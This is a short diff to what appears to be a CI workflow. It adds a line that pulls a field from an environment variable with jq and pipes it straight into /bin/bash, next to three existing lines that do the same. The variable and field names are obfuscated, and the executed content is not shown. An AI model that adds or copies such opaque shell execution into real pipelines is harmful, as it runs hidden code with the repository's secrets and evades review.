@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$fcmm6" | jq -r .t3 | /bin/bash
           echo $ez1545 | jq -r .rzsjs1012 | /bin/bash
           echo $o2 | jq -r .vmsd2 | /bin/bash
+          echo $txfra580 | jq -r .spy60496 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
